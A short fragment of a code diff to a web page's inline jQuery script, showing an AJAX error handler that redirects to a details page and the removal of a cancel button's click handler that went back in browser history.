                     },
                     error: function() {
@@ -632,11 +681,6 @@
                         window.location.href = 'details.html';
                     }
                 });
-            });
-            
-            // Cancel button - go back to previous page
-            $('.btn-outline-secondary').click(function() {
-                window.history.back();
             });
         });
     </script>
